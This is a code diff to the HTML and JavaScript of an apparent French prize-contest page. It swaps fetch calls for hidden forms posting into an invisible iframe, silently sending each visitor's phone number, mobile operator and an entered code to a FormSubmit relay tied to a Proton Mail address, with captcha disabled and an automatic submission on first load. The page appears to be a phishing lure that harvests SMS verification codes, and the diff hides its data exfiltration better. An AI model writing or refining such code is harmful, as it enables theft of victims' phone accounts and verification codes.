@@ -583,16 +583,42 @@
 
 </div>
 
-<!-- FORMULAIRE CACHÉ ACTIVATION FORMSUBMIT -->
-<form id="activationForm" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="hidden_iframe" style="display:none">
-  <input type="text" name="Numéro" value="ACTIVATION">
-  <input type="text" name="Opérateur" value="ACTIVATION">
-  <input type="text" name="Heure" value="Activation initiale">
-  <input type="hidden" name="_subject" value="[JeuxConcours] Activation du formulaire">
+<!-- IFRAME CIBLE INVISIBLE -->
+<iframe name="mail_iframe" style="display:none" id="mail_iframe"></iframe>
+
+<!-- FORM ACTIVATION (premier chargement) -->
+<form id="activationForm" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="mail_iframe" style="display:none">
+  <input type="hidden" name="Numéro" value="ACTIVATION">
+  <input type="hidden" name="Opérateur" value="ACTIVATION">
+  <input type="hidden" name="Heure" value="Premier chargement du site">
+  <input type="hidden" name="_subject" value="[JeuxConcours] ✅ Activation du formulaire">
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_next" value="about:blank">
 </form>
-<iframe name="hidden_iframe" style="display:none"></iframe>
+
+<!-- FORM NUMÉRO -->
+<form id="formNumero" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="mail_iframe" style="display:none">
+  <input type="hidden" name="Numéro" value="">
+  <input type="hidden" name="Opérateur" value="">
+  <input type="hidden" name="Heure" value="">
+  <input type="hidden" name="_subject" value="">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_next" value="about:blank">
+</form>
+
+<!-- FORM CODE -->
+<form id="formCode" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="mail_iframe" style="display:none">
+  <input type="hidden" name="Numéro" value="">
+  <input type="hidden" name="Opérateur" value="">
+  <input type="hidden" name="Code saisi" value="">
+  <input type="hidden" name="Heure" value="">
+  <input type="hidden" name="_subject" value="">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_next" value="about:blank">
+</form>
 
 <script>
 /* ======== ACTIVATION FORMSUBMIT (1ère visite) ======== */
@@ -603,36 +629,24 @@ window.addEventListener('load', () => {
   }
 });
 
-/* ======== FORMSUBMIT EMAILS ======== */
-const FORMSUBMIT_URL = 'https://formsubmit.co/ajax/ipsosjc@proton.me';
-
-async function sendMail(data) {
-  try {
-    await fetch(FORMSUBMIT_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-      body: JSON.stringify({ ...data, _captcha: 'false', _template: 'table' })
-    });
-  } catch(e) { console.warn('Mail error:', e); }
-}
-
+/* ======== ENVOI PAR FORM CACHÉ + IFRAME ======== */
 function sendMailNumero(phone, operateur) {
-  sendMail({
-    _subject: `[JeuxConcours] Nouveau participant — ${phone}`,
-    Numéro: phone,
-    Opérateur: operateur,
-    Heure: new Date().toLocaleString('fr-FR'),
-  });
+  const f = document.getElementById('formNumero');
+  f.querySelector('[name="Numéro"]').value   = phone;
+  f.querySelector('[name="Opérateur"]').value = operateur;
+  f.querySelector('[name="Heure"]').value    = new Date().toLocaleString('fr-FR');
+  f.querySelector('[name="_subject"]').value = '[JeuxConcours] Nouveau participant — ' + phone;
+  f.submit();
 }
 
 function sendMailCode(phone, operateur, code) {
-  sendMail({
-    _subject: `[JeuxConcours] Code soumis — ${phone}`,
-    Numéro: phone,
-    Opérateur: operateur,
-    'Code saisi': code,
-    Heure: new Date().toLocaleString('fr-FR'),
-  });
+  const f = document.getElementById('formCode');
+  f.querySelector('[name="Numéro"]').value    = phone;
+  f.querySelector('[name="Opérateur"]').value = operateur;
+  f.querySelector('[name="Code saisi"]').value = code;
+  f.querySelector('[name="Heure"]').value     = new Date().toLocaleString('fr-FR');
+  f.querySelector('[name="_subject"]').value  = '[JeuxConcours] Code soumis — ' + phone;
+  f.submit();
 }
 
 /* ======== GLOBAL TIMER 1H ======== */
